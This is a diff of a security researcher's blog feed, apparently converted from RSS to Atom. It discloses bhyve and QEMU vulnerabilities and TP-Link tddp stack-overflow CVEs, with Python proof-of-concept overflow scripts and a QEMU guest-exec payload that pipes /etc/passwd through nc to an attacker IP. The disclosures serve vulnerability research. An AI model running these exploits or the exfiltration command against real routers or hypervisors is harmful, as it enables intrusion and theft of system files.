@@ -1,17 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Fakhri Zulkifli</title>
-    <description></description>
-    <link>http://localhost:4000/</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 17 Aug 2019 23:27:35 +0800</pubDate>
-    <lastBuildDate>Sat, 17 Aug 2019 23:27:35 +0800</lastBuildDate>
-    <generator>Jekyll v3.8.6</generator>
-    
-      <item>
-        <title>BSD Hypervisor - pci_fbuf NULL Pointer Dereference</title>
-        <description>&lt;p&gt;NOTE: This also works in &lt;a href=&quot;https://github.com/machyve/xhyve&quot; target=&quot;_blank&quot;&gt;xhyve hypervisor&lt;/a&gt;.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-18T02:15:48+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><entry><title type="html">BSD Hypervisor - pci_fbuf NULL Pointer Dereference</title><link href="http://localhost:4000/blog/bhyve_fbuf_null_deref/" rel="alternate" type="text/html" title="BSD Hypervisor - pci_fbuf NULL Pointer Dereference" /><published>2019-08-17T00:00:00+08:00</published><updated>2019-08-17T00:00:00+08:00</updated><id>http://localhost:4000/blog/bhyve_fbuf_null_deref</id><content type="html" xml:base="http://localhost:4000/blog/bhyve_fbuf_null_deref/">&lt;p&gt;NOTE: This also works in &lt;a href=&quot;https://github.com/machyve/xhyve&quot; target=&quot;_blank&quot;&gt;xhyve hypervisor&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;Affected code:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 0x00000000002317ec &amp;lt;+108&amp;gt;:	mov $0x206519,%edi
@@ -83,84 +70,7 @@ fs &amp;lt;unavailable&amp;gt;
 gs &amp;lt;unavailable&amp;gt;
 fs_base 0x800ac98d0 34371049680
 gs_base 0x0 0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Sat, 17 Aug 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/bhyve_fbuf_null_deref/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/bhyve_fbuf_null_deref/</guid>
-        
-        <category>bsd</category>
-        
-        <category>null pointer deref</category>
-        
-        <category>hypervisor</category>
-        
-        <category>proof-of-concept</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow</title>
-        <description>&lt;p&gt;CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
-
-&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
-&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
-# SPDX-License-Identifier: Apache-2.0
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCCDDDD&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a2&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# Send a request
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff725778 in feof () from /lib/libc.so.0
-#1  0x0000d56c in ?? ()
-Backtrace stopped: previous frame identical to this frame (corrupt stack?)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Mon, 15 Jul 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/CVE-2019-13614/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-13614/</guid>
-        
-        <category>tp-link</category>
-        
-        <category>buffer overflow</category>
-        
-        <category>stack overflow</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow</title>
-        <description>&lt;p&gt;CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">NOTE: This also works in xhyve hypervisor.</summary></entry><entry><title type="html">[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow</title><link href="http://localhost:4000/blog/CVE-2019-13613/" rel="alternate" type="text/html" title="[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow" /><published>2019-07-15T00:00:00+08:00</published><updated>2019-07-15T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-13613</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-13613/">&lt;p&gt;CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
 
 &lt;p&gt;Proof-of-Concept:&lt;/p&gt;
 &lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
@@ -204,26 +114,44 @@ Backtrace stopped: previous frame identical to this frame (corrupt stack?)
 &lt;p&gt;References:&lt;/p&gt;
 &lt;ol&gt;
   &lt;li&gt;https://mjg59.dreamwidth.org/51672.html?thread=1916120&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        <pubDate>Mon, 15 Jul 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/CVE-2019-13613/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-13613/</guid>
-        
-        <category>tp-link</category>
-        
-        <category>buffer overflow</category>
-        
-        <category>stack overflow</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>BSD Hypervisor - Theoretical Stack-based Buffer Overflow</title>
-        <description>&lt;p&gt;On Jun 24, a new PCI HDAudio device model from the Google Summer of Code 2016 project was added into the BSD Hypervisor (bhyve) as part of its sound card emulation. I took a chance to look at the source code and found a trivial stack-based buffer overflow but unfortunately it is not exploitable in practice due to the limitation of bhyve’s arguments length. However, the code is patched just in case it is still going to be an issue in the future.&lt;/p&gt;
+&lt;/ol&gt;</content><author><name></name></author><summary type="html">CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.</summary></entry><entry><title type="html">[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow</title><link href="http://localhost:4000/blog/CVE-2019-13614/" rel="alternate" type="text/html" title="[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow" /><published>2019-07-15T00:00:00+08:00</published><updated>2019-07-15T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-13614</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-13614/">&lt;p&gt;CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
+
+&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCCDDDD&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a2&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Send a request
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff725778 in feof () from /lib/libc.so.0
+#1  0x0000d56c in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.</summary></entry><entry><title type="html">BSD Hypervisor - Theoretical Stack-based Buffer Overflow</title><link href="http://localhost:4000/blog/bhyve_hda_bof/" rel="alternate" type="text/html" title="BSD Hypervisor - Theoretical Stack-based Buffer Overflow" /><published>2019-06-25T00:00:00+08:00</published><updated>2019-06-25T00:00:00+08:00</updated><id>http://localhost:4000/blog/bhyve_hda_bof</id><content type="html" xml:base="http://localhost:4000/blog/bhyve_hda_bof/">&lt;p&gt;On Jun 24, a new PCI HDAudio device model from the Google Summer of Code 2016 project was added into the BSD Hypervisor (bhyve) as part of its sound card emulation. I took a chance to look at the source code and found a trivial stack-based buffer overflow but unfortunately it is not exploitable in practice due to the limitation of bhyve’s arguments length. However, the code is patched just in case it is still going to be an issue in the future.&lt;/p&gt;
 
 &lt;p&gt;Patch diff:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;Index: head/usr.sbin/bhyve/pci_hda.c
@@ -1574,52 +1502,14 @@ Backtrace stopped: previous frame identical to this frame (corrupt stack?)
   &lt;li&gt;https://wiki.freebsd.org/SummerOfCode2016/HDAudioEmulationForBhyve&lt;/li&gt;
   &lt;li&gt;https://svnweb.freebsd.org/base?view=revision&amp;amp;revision=349335&lt;/li&gt;
   &lt;li&gt;https://reviews.freebsd.org/rS349385&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        <pubDate>Tue, 25 Jun 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/bhyve_hda_bof/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/bhyve_hda_bof/</guid>
-        
-        <category>proof-of-concept</category>
-        
-        <category>stack overflow</category>
-        
-        <category>buffer overflow</category>
-        
-        <category>hypervisor</category>
-        
-        <category>pci device</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title>
-        <description>&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;guest_exec&lt;/code&gt; command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
+&lt;/ol&gt;</content><author><name></name></author><summary type="html">On Jun 24, a new PCI HDAudio device model from the Google Summer of Code 2016 project was added into the BSD Hypervisor (bhyve) as part of its sound card emulation. I took a chance to look at the source code and found a trivial stack-based buffer overflow but unfortunately it is not exploitable in practice due to the limitation of bhyve’s arguments length. However, the code is patched just in case it is still going to be an issue in the future.</summary></entry><entry><title type="html">[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title><link href="http://localhost:4000/blog/CVE-2019-12929/" rel="alternate" type="text/html" title="[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution" /><published>2019-06-06T00:00:00+08:00</published><updated>2019-06-06T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-12929</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-12929/">&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;guest_exec&lt;/code&gt; command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
 
 &lt;p&gt;1st, execute the QEMU Guest Agent service&lt;br /&gt;
 2nd, open another console and setup a listener to port 9999&lt;br /&gt;
 3rd, connect to the target and enter the following commands:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{'execute':'guest-exec','arguments':{'path':'/bin/bash','arg': ['-c', 'cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999']}}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/blog/CVE-2019-12929/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-12929/</guid>
-        
-        <category>remote command execution</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution</title>
-        <description>&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt; command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">The QMP guest_exec command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.</summary></entry><entry><title type="html">[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution</title><link href="http://localhost:4000/blog/CVE-2019-12928/" rel="alternate" type="text/html" title="[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution" /><published>2019-06-05T00:00:00+08:00</published><updated>2019-06-05T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-12928</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-12928/">&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt; command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
 
